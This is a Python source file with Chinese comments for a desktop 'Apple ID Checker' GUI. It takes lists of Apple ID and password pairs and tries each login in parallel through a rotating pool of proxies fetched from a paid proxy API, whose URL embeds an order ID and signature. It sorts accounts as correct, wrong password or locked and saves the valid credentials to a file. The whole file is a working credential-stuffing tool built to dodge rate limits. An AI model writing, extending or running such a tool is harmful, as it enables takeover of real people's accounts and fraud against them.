import webview
import requests
import threading
import queue
import concurrent.futures
import logging
from apple_id_checker import AppleIDChecker
from threading import Lock, Event
from concurrent.futures import ThreadPoolExecutor
import tempfile
import os


result_file_path = None

# 配置日志记录
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# 常量
PROXY_API_URL = 'https://api.hailiangip.com:8522/api/getIp?type=1&num=200&pid=-1&unbindTime=180&cid=-1&orderId=O23110722352356692123&time=1699738697&sign=4bc1e1ba75c91b0da7d6328552104498&noDuplicate=1&dataType=1&lineSeparator=0'  # 请替换成您的代理获取API的URL
NUM_PROXIES_TO_FETCH = 200  # 每次API调用最多获取的代理数

# 代理队列全局变量
proxy_queue = queue.Queue()
proxy_queue_lock = Lock()  # A lock to ensure thread-safe operations on the proxy queue
stop_event = Event()  # An event to signal the threads to stop
# 全局锁用于文件写入
write_results_lock = threading.Lock()

def fetch_and_replenish_proxy_queue_thread_safe(num_proxies):
    with proxy_queue_lock:  # Ensure that only one thread can replenish the queue at a time
        fetch_and_replenish_proxy_queue(num_proxies)

# 获取代理IP并填充队列的函数


def fetch_and_replenish_proxy_queue(num_proxies):
    # 获取代理列表，并且填充到队列中
        response = requests.get(PROXY_API_URL)
        proxies = response.text.strip().split('\n')
        for proxy in proxies:
            proxy_queue.put(proxy)


def write_result_to_file(apple_id, password, status):
    global result_file_path
    if result_file_path is None:
        temp_file = tempfile.NamedTemporaryFile(delete=False, mode='w', suffix='.txt', prefix='results_', dir='.')  # 创建临时文件
        result_file_path = temp_file.name
        temp_file.close()   # 创建文件后立即关闭，稍后再次打开进行写入

    with write_results_lock, open(result_file_path, 'a') as file:  # 使用锁保证线程安全
        file.write(f"{apple_id}----{password}---{status}\n")


# 使用提供的代理检查Apple ID的函数
def check_apple_id(apple_id, password):
    # Assuming the AppleIDChecker class and its try_login method are correctly defined
    checker = AppleIDChecker()
    proxy = None
    while not stop_event.is_set():  # Check if the event is set before each operation
        try:
            if proxy_queue.empty():  # If the queue is empty, fetch new proxies
                logger.info("Queue is empty, fetching new proxies...")
                fetch_and_replenish_proxy_queue_thread_safe(
                    NUM_PROXIES_TO_FETCH)

            proxy = proxy_queue.get(timeout=5)  # Get a proxy with a timeout
            result = checker.try_login(apple_id, password, proxy)
            write_result_to_file(apple_id, password, result['status'])  # 实时写入结果
            return {'apple_id': apple_id, 'password': password, 'status': result['status']}
            # return result  # This will exit only the current thread
        except queue.Empty:
            logger.error(
                "Queue is empty, no available proxy IPs, stopping check.")
            break
        except Exception as e:
            logger.error(f"Error for {apple_id}: {e}")
            # Consider if you want to re-raise the exception or handle it differently

    logger.info(
        f"Thread {threading.current_thread().name} received stop signal for {apple_id}")


# Define a global variable to hold the window reference
global_window = None

# 对外暴露给webview的API类
# 对外暴露的API类


class Api:
    def __init__(self):
        self.checker = AppleIDChecker()
        self.is_checking = False  # 标记当前是否正在检查

    # 设置代理API地址的方法
    def set_proxy_api(self, proxy_api_url):
        global PROXY_API_URL  # 使用global关键字来更新全局变量
        PROXY_API_URL = proxy_api_url

    # 使用新的代理API地址获取代理的方法
    def fetch_proxies(self, num_proxies):
        if not PROXY_API_URL:
            logger.error("代理API地址未设置。")
            return []

        response = requests.get(PROXY_API_URL, params={
                                'type': '1', 'num': num_proxies})  # 使用新的API地址来获取代理
        if response.ok:
            # 根据实际响应格式拆分代理字符串
            return response.text.strip().split('\n')
        else:
            logger.error("Failed to retrieve proxies: %s",
                         response.status_code)
            return []

    # 初始化代理队列的函数
    def initialize_proxy_queue(self, num_proxies):
        proxies = self.fetch_proxies(num_proxies)
        for proxy in proxies:
            proxy_queue.put(proxy)

    def get_results_file_path(self):
        global result_file_path
        return result_file_path if result_file_path and os.path.exists(result_file_path) else ''

    # 在 Api 类中修改 download_file 方法
    def download_file(self):
        global result_file_path
        try:
            # Ensure the result file exists before trying to open a save dialog
            if result_file_path and os.path.exists(result_file_path):
                # Run the save dialog in the main thread
                save_dialog = webview.windows[0].create_file_dialog(webview.SAVE_DIALOG, directory=os.path.dirname(result_file_path), save_filename=os.path.basename(result_file_path))
                if save_dialog:
                    # Only attempt to write to the file if a save path was provided
                    with open(result_file_path, 'r') as source, open(save_dialog, 'w') as target:
                        target.write(source.read())
                    return 'File saved successfully to ' + save_dialog
                else:
                    return 'File save cancelled by the user.'
            else:
                return 'No result file found. Please run the checks first.'
        except Exception as e:
            logger.exception("Failed to save the file.")
            return f"An error occurred while saving the file: {str(e)}"

    def get_results_file(self):
        # This path must be accessible by the web server serving the files
        return './results.txt'

    def stop_checking(self):
        logger.info("Stopping all threads...")
        stop_event.set()  # Signal all threads to stop

    # 开始检查Apple IDs的对外暴露方法
    def check_apple_ids(self, file_content, num_threads):
        if self.is_checking:  # 如果当前正在检查，则返回
            return

        self.is_checking = True
        self.initialize_proxy_queue(min(num_threads, NUM_PROXIES_TO_FETCH))

        # 将文件内容拆分为Apple ID和密码对
        apple_ids = [line.split(
            '----') for line in file_content.strip().split('\n') if '----' in line]

        # detail_results = []
        # 使用线程池执行并发检查
        results = {"correct": 0, "incorrect": 0, "locked": 0, "exception": 0,
                    "total": len(apple_ids), "detected": 0, "undetected": 0}
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures_to_apple_id = {executor.submit(
                check_apple_id, apple_id, password): apple_id for apple_id, password in apple_ids}

            # 处理完成的任务并更新UI
            for future in concurrent.futures.as_completed(futures_to_apple_id):
                apple_id = futures_to_apple_id[future]
                try:
                    result = future.result()
                    # 根据结果更新计数器
                    if result["status"] == "密码正确":
                        results["correct"] += 1
                        results["detected"] += 1
                    elif result["status"] == "密码错误":
                        results["incorrect"] += 1
                        results["detected"] += 1
                    elif result["status"] == "帐号被锁":
                        results["locked"] += 1
                        results["detected"] += 1
                    else:
                        results["exception"] += 1
                        results["detected"] += 1

                    results["undetected"] = results["total"] - \
                        results["detected"]

                    # 使用线程安全的方式更新UI
                    update_ui_with_results(results)
                    # detail_results.append(result)
                except Exception as exc:
                    logger.error(
                        f'Apple ID check for {apple_id} generated an exception: {exc}')
            # self.write_result_to_file(detail_results)

        self.is_checking = False  # 重置检查标志


# 安全地在主线程中更新UI的函数
def update_ui_with_results(results):
    # 构造更新UI的JavaScript代码
    update_ui_script = f"""
        document.getElementById('correct-count').innerText = '{results['correct']}';
        document.getElementById('incorrect-count').innerText = '{results['incorrect']}';
        document.getElementById('locked-count').innerText = '{results['locked']}';
        document.getElementById('exception-count').innerText = '{results['exception']}';
        document.getElementById('total-count').innerText = '{results['total']}';
        document.getElementById('detected-count').innerText = '{results['detected']}';
        document.getElementById('undetected-count').innerText = '{results['undetected']}';
    """
    # 在主线程中执行JavaScript代码更新UI
    global_window.evaluate_js(update_ui_script)

# 创建webview窗口并启动


def create_webview_window():
    global global_window  # Use the global keyword to modify the global variable
    api = Api()
    global_window = webview.create_window(
        'Apple ID Checker', 'index.html', js_api=api, width=800, height=500, resizable=False, min_size=(800, 500))
    webview.start()


if __name__ == '__main__':
    create_webview_window()
